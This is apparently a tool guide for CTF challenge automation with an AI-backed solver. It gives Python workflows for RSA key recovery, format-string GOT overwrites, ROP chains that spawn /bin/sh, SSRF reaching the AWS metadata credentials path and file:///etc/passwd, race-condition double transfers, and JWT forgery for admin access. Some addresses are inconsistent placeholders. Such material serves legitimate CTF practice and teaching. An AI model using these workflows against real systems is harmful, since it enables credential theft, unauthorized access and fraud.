# CTF Workflows - Modular Challenge Automation

This guide provides end-to-end workflows for solving common CTF challenge categories using HexStrike AI's modular solver tools.

---

## 1. RSA Cryptography Challenges

### Scenario 1.1: Complete RSA Challenge (Minimal Information)

**Challenge Description:**
```
We have an RSA encrypted message. Can you decrypt it?
Given:
- n = 323
- e = 17
- ciphertext = 100
```

**Workflow:**

```python
# Step 1: Classify the challenge
from hexstrike_mcp import setup_mcp_server, HexStrikeClient

client = HexStrikeClient("http://localhost:8888")
classification = client.safe_post("api/ctf/solvers/classify", {
    "description": "RSA encrypted message with n=323, e=17, c=100"
})
print(f"Category: {classification['category']}")  # → CRYPTO
print(f"Subtype: {classification['subtype']}")    # → rsa
print(f"Tools: {classification['recommended_tools']}")  # → [rsa_auto_attack, rsa_wiener, rsa_fermat]

# Step 2: Use auto-attack to try multiple approaches
result = client.safe_post("api/ctf/solvers/rsa/auto-attack", {
    "n": "323",
    "e": "17",
    "c": "100"
})

if result["success"]:
    print(f"Attack Type: {result['attack_type']}")      # → fermat
    print(f"P: {result['p']}, Q: {result['q']}")        # → p=17, q=19
    print(f"Private Exponent: {result['d']}")           # → 29
    print(f"Plaintext: {result['plaintext']}")          # → Flag value
    print(f"FLAG: {result['flag']}")                    # → flag{...}
else:
    print(f"Auto-attack failed: {result['message']}")
```

**Time Complexity:** ~1 second for small moduli

---

### Scenario 1.2: Wiener's Attack (Large e, Small d)

**Challenge Description:**
```
We intercepted RSA parameters with a very large public exponent.
Find the private key.

n = 861793834127827987
e = 123456789012345
ciphertext = 456789123456789
```

**Workflow:**

```python
# Step 1: Classify
classification = client.safe_post("api/ctf/solvers/classify", {
    "description": "RSA with extremely large e value",
    "hints": "large e, small d suspected"
})
# → category: CRYPTO, subtype: RSA

# Step 2: Try Wiener's attack specifically
wiener_result = client.safe_post("api/ctf/solvers/rsa/wiener", {
    "n": "861793834127827987",
    "e": "123456789012345",
    "c": "456789123456789"
})

if wiener_result["success"]:
    print(f"Recovered d: {wiener_result['d']}")
    print(f"Decrypted message: {wiener_result['plaintext']}")
    print(f"Flag: {wiener_result['flag']}")
else:
    # Fall back to auto-attack
    auto_result = client.safe_post("api/ctf/solvers/rsa/auto-attack", {
        "n": "861793834127827987",
        "e": "123456789012345",
        "c": "456789123456789"
    })
```

**When to Use:** e > 2^30 and d suspected to be < N^0.25

---

### Scenario 1.3: Fermat Factorization (Close Primes)

**Challenge Description:**
```
Challenge: Factor this RSA modulus
n = 949406050000103423
e = 65537

Hint: The prime factors are very close to each other.
```

**Workflow:**

```python
# Step 1: Classify
classification = client.safe_post("api/ctf/solvers/classify", {
    "description": "Factor RSA modulus with close prime factors"
})
# → recommended_tools includes rsa_fermat_attack

# Step 2: Apply Fermat factorization
result = client.safe_post("api/ctf/solvers/rsa/fermat", {
    "n": "949406050000103423",
    "e": "65537",
    "max_iterations": 10000
})

if result["success"]:
    print(f"Factorization: {result['p']} × {result['q']}")
    print(f"Private exponent d: {result['d']}")

    # Now can decrypt any messages
    c = 123456789
    plaintext = pow(c, result['d'], int("949406050000103423"))
    print(f"Plaintext: {plaintext}")
```

**Time Complexity:** O(√N) - fast when |p-q| is small

---

## 2. Binary Exploitation (Pwn Challenges)

### Scenario 2.1: Format String Vulnerability + GOT Overwrite

**Challenge Description:**
```
Binary: vuln.bin (x86-64)
Vulnerability: Format string vulnerability in printf()
Goal: Overwrite malloc in GOT to gain code execution

Offsets:
- Format string offset: 6
- malloc GOT entry: 0x601018
- system() address: 0x400686
- Target: Execute /bin/sh
```

**Workflow:**

```python
# Step 1: Classify the challenge
classification = client.safe_post("api/ctf/solvers/classify", {
    "description": "Binary exploitation challenge",
    "files": ["vuln.bin"],
    "hints": "format string vulnerability, printf function"
})
# → category: PWN, subtype: format_string

# Step 2: Generate format string arbitrary write payload
write_payload = client.safe_post("api/ctf/solvers/format-string/arbitrary-write", {
    "address": "0x601020",      # Target address to overwrite
    "value": "0xdeadbeef",      # Test value first
    "offset": 6,                # Found through trial and error
    "arch": "x64"
})

print(f"Payload (hex): {write_payload['payload_hex']}")
print(f"Payload (ASCII): {write_payload['payload_ascii']}")
print(f"Description: {write_payload['description']}")

# Step 3: For actual exploitation, use GOT overwrite
got_payload = client.safe_post("api/ctf/solvers/format-string/got-overwrite", {
    "got_entry": "0x601018",    # malloc GOT entry
    "target_addr": "0x400686",  # system() function address
    "offset": 6,
    "arch": "x64"
})

# Step 4: Craft exploit
exploit_input = f"{got_payload['payload_ascii']}{JUNK_TO_TRIGGER_PRINTF}"
# Send exploit_input to vulnerable binary
# malloc() will now call system(), allowing command execution
```

**Manual Verification Steps:**
```bash
# 1. Confirm offset through gdb
gdb ./vuln.bin
(gdb) break printf
(gdb) run
<input 12 %x values>
# Count which position shows our input

# 2. Confirm GOT address
readelf -r vuln.bin | grep malloc

# 3. Find system() address
objdump -d vuln.bin | grep system
```

---

### Scenario 2.2: Complete ROP Exploitation

**Challenge Description:**
```
Binary: ropme.bin (x86-64, NX enabled, ASLR off)
Vulnerability: Stack buffer overflow
Goal: Chain ROP gadgets to call execve("/bin/sh")

Problem: Stack is non-executable (NX)
Solution: Use Return-Oriented Programming
```

**Workflow:**

```python
# Step 1: Classify
classification = client.safe_post("api/ctf/solvers/classify", {
    "description": "Binary with stack buffer overflow, NX enabled",
    "files": ["ropme.bin"]
})
# → category: PWN, subtype: ROP

# Step 2: Extract gadgets from binary
gadgets_result = client.safe_post("api/ctf/solvers/rop/find-gadgets", {
    "binary_path": "/path/to/ropme.bin",
    "arch": "x64"
})

print(f"Total gadgets found: {gadgets_result['gadget_count']}")

# Step 3: Build ROP chain for execve
# First, format gadgets as JSON
gadgets_json = {
    "POP_RDI": {
        "address": "0x400686",
        "instructions": "pop rdi; ret"
    },
    "POP_RSI": {
        "address": "0x400687",
        "instructions": "pop rsi; pop r15; ret"
    },
    "SYSCALL": {
        "address": "0x400688",
        "instructions": "syscall"
    }
}

# Build the chain
chain_result = client.safe_post("api/ctf/solvers/rop/build-execve", {
    "gadgets_json": json.dumps(gadgets_json),
    "binsh_addr": "0x601000",  # Address of "/bin/sh" string
    "arch": "x64"
})

print(f"Chain hex: {chain_result['chain_hex']}")
print(f"Chain length: {chain_result['chain_length']} bytes")
print(f"Chain dump:\n{chain_result['chain_dump']}")

# Step 4: Craft full exploit
# BOF_PADDING (up to saved RIP) + chain_hex
exploit = b"A" * 264 + bytes.fromhex(chain_result['chain_hex'])

# Send to vulnerable program
with socket.socket() as s:
    s.connect(("localhost", 9999))
    s.send(exploit)
    s.send(b"whoami\n")  # Execute command in spawned shell
```

**ROP Chain Structure (x86-64):**
```
1. pop rdi; ret           → RDI = pointer to "/bin/sh"
2. pop rsi; pop r15; ret  → RSI = 0 (NULL for argv)
3. pop rdx; ret           → RDX = 0 (NULL for envp)
4. syscall               → Execute execve("/bin/sh", NULL, NULL)
```

---

## 3. Web Exploitation (Web Challenges)

### Scenario 3.1: SSRF Vulnerability Chain

**Challenge Description:**
```
Target: http://example.com:3000
Goal: Access internal services through SSRF

Suspected vulnerable endpoints:
- /api/fetch (parameter: url)
- /image/download (parameter: imageUrl)
- /proxy (parameter: target)
```

**Workflow:**

```python
# Step 1: Classify
classification = client.safe_post("api/ctf/solvers/classify", {
    "description": "Web application with SSRF vulnerability",
    "url": "http://example.com:3000",
    "hints": "fetch image from URL, access internal services"
})
# → category: WEB, subtype: SSRF

# Step 2: Discover SSRF chains
ssrf_result = client.safe_post("api/ctf/solvers/web/ssrf-discover", {
    "target": "http://example.com:3000",
    "endpoints": "/api/fetch,/image/download,/proxy",
    "parameters": "url,imageUrl,target",
    "timeout": 30
})

print(f"Chains found: {ssrf_result['chains_found']}")
for chain in ssrf_result['chains']:
    print(f"\n✓ Endpoint: {chain['endpoint']}")
    print(f"  Parameter: {chain['parameter']}")
    print(f"  Protocol: {chain['protocol']}")
    print(f"  Payload: {chain['payload']}")
    print(f"  Evidence: {chain['evidence']}")

# Step 3: Manual exploitation using discovered chains
# Example: Access internal metadata service
response = requests.get(
    "http://example.com:3000/api/fetch",
    params={"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials"}
)
print(response.text)  # AWS credentials exposed via SSRF
```

**SSRF Exploitation Vectors:**
- `file:///etc/passwd` - Read local files
- `http://localhost:8080/admin` - Access internal services
- `http://169.254.169.254/latest/meta-data/` - AWS metadata
- `gopher://localhost:25/` - Interact with other protocols
- `dict://localhost:11211/` - Access memcached

---

### Scenario 3.2: Race Condition Attack

**Challenge Description:**
```
Target: http://bank.example.com/api/transfer
Issue: Transfer API doesn't properly handle concurrent requests
Goal: Execute duplicate transactions/bypass balance checks

Vulnerable endpoint: POST /api/transfer
Parameters: from, to, amount
```

**Workflow:**

```python
# Step 1: Classify
classification = client.safe_post("api/ctf/solvers/classify", {
    "description": "Web API vulnerable to race conditions",
    "url": "http://bank.example.com",
    "hints": "transfer API, concurrent request handling"
})
# → category: WEB, subtype: race_condition

# Step 2: Craft payload
payload = {
    "from": "attacker",
    "to": "admin",
    "amount": 100000
}

# Step 3: Execute race condition attack
race_result = client.safe_post("api/ctf/solvers/web/race-condition", {
    "target": "http://bank.example.com",
    "endpoint": "/api/transfer",
    "payload": json.dumps(payload),
    "concurrent": 100  # Send 100 concurrent requests
})

print(f"Success: {race_result['success']}")
print(f"Requests sent: {race_result['requests_sent']}")
print(f"Anomalies detected: {race_result['anomalies_detected']}")
print(f"Avg response time: {race_result['timing_analysis']['average_response_time']}")

if "flag" in race_result:
    print(f"FLAG: {race_result['flag']}")
```

**Race Condition Scenarios:**
- Double spending in payment systems
- Bypassing OTP rate limiting
- Accessing resources before permission checks
- Creating duplicate database entries

---

### Scenario 3.3: JWT Token Attack

**Challenge Description:**
```
API protected by JWT authentication
Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6InVzZXIifQ...
Goal: Forge admin token and access protected endpoints
```

**Workflow:**

```python
# Step 1: Classify
classification = client.safe_post("api/ctf/solvers/classify", {
    "description": "JWT authentication bypass",
    "hints": "JWT token, admin access required"
})
# → category: WEB, subtype: JWT

# Step 2: Analyze and attack JWT
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6InVzZXIifQ.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ"

jwt_result = client.safe_post("api/ctf/solvers/web/jwt-attack", {
    "token": token,
    "target": "http://api.example.com",
    "endpoint": "/api/admin"
})

print(f"Token valid: {jwt_result['token_valid']}")
print(f"Algorithm: {jwt_result['signature_algorithm']}")
print(f"Payload: {jwt_result['payload_decoded']}")
print(f"Vulnerabilities found: {len(jwt_result['vulnerabilities'])}")

for vuln in jwt_result['vulnerabilities']:
    print(f"\n[{vuln['severity']}] {vuln['type']}")
    print(f"  Description: {vuln['description']}")
    if 'forged_token' in vuln:
        print(f"  Forged token: {vuln['forged_token']}")

# Step 3: Use forged token to access protected resource
if jwt_result['vulnerabilities']:
    forged_token = jwt_result['vulnerabilities'][0].get('forged_token')
    if forged_token:
        response = requests.get(
            "http://api.example.com/api/admin",
            headers={"Authorization": f"Bearer {forged_token}"}
        )
        print(f"Admin access response: {response.text}")
```

**JWT Vulnerabilities:**
- Algorithm confusion (RS256 → HS256)
- None algorithm (`"alg": "none"`)
- Weak secrets (brute-forceable)
- Key confusion attacks
- Token signing bypass

---

## 4. Multi-Stage Challenge Workflow

**Complex Challenge:**
```
A CTF challenge with multiple stages:
1. RSA decryption to get password
2. SSH into server with password
3. Binary exploitation to get flag
```

**Workflow:**

```python
# Stage 1: Solve RSA
print("[*] Stage 1: RSA Challenge")
rsa_result = client.safe_post("api/ctf/solvers/rsa/auto-attack", {
    "n": CHALLENGE_N,
    "e": CHALLENGE_E,
    "c": CHALLENGE_C
})
password = rsa_result['flag']
print(f"[+] Password: {password}")

# Stage 2: SSH and gather binary
print("[*] Stage 2: Remote Binary Exploitation")
ssh = ssh_connect(CHALLENGE_HOST, username="user", password=password)
ssh.exec_command("file /home/user/flag_binary")
ssh.get("/home/user/flag_binary", "/tmp/flag_binary")

# Stage 3: Exploit binary locally
print("[*] Stage 3: Binary Analysis")
classification = client.safe_post("api/ctf/solvers/classify", {
    "files": ["flag_binary"]
})

if classification['subtype'] == 'format_string':
    # Generate format string exploit
    payload = client.safe_post("api/ctf/solvers/format-string/arbitrary-write", {...})
    # Use payload in exploit

elif classification['subtype'] == 'rop':
    # Generate ROP chain
    gadgets = client.safe_post("api/ctf/solvers/rop/find-gadgets", {...})
    # Build and deploy chain

# Stage 4: Extract flag
print("[+] Flag obtained!")
```

---

## 5. Performance Optimization

### Parallel Classification

```python
# Classify multiple challenges concurrently
from concurrent.futures import ThreadPoolExecutor

challenges = [
    {"description": "RSA challenge 1", "files": ["rsa1.pub"]},
    {"description": "Format string challenge", "files": ["vuln1"]},
    {"description": "Web SSRF", "url": "http://web1.local"}
]

def classify(challenge):
    return client.safe_post("api/ctf/solvers/classify", challenge)

with ThreadPoolExecutor(max_workers=3) as executor:
    results = list(executor.map(classify, challenges))
```

### Gadget Caching

```python
# Extract gadgets once, reuse for multiple chains
gadgets_cache = client.safe_post("api/ctf/solvers/rop/find-gadgets", {
    "binary_path": "/path/to/binary",
    "arch": "x64"
})

# Build multiple chains using cached gadgets
for target_addr in target_addresses:
    chain = client.safe_post("api/ctf/solvers/rop/build-execve", {
        "gadgets_json": json.dumps(select_gadgets(gadgets_cache)),
        "binsh_addr": target_addr
    })
```

---

## 6. Troubleshooting & Tips

| Problem | Solution |
|---------|----------|
| Auto-attack times out | Reduce `timeout` parameter or use specific attack method |
| Format string offset wrong | Try all offsets 1-20 with small test writes first |
| ROP gadgets insufficient | Use `objdump` to manually find gadgets or try different binary sections |
| SSRF not discovering chains | Increase `timeout`, add more `endpoints` and `parameters` |
| JWT analysis shows no vulns | Check token expiration, try with different endpoints |
| Race condition needs tuning | Adjust `concurrent` parameter based on server capacity |

---

## 7. References

- **RSA Attacks:** [Wiener's Attack](https://en.wikipedia.org/wiki/Wiener%27s_attack), [Fermat Factorization](https://en.wikipedia.org/wiki/Fermat%27s_factorization_method)
- **Binary Exploitation:** [ROP Gadgets](https://en.wikipedia.org/wiki/Return-oriented_programming), [Format Strings](https://owasp.org/www-community/attacks/Format_string_attack)
- **Web Security:** [SSRF](https://owasp.org/www-community/attacks/Server-Side_Request_Forgery), [Race Conditions](https://en.wikipedia.org/wiki/Race_condition#Computing), [JWT](https://jwt.io)

For detailed tool documentation, see `docs/mcp-tools-guide.md`
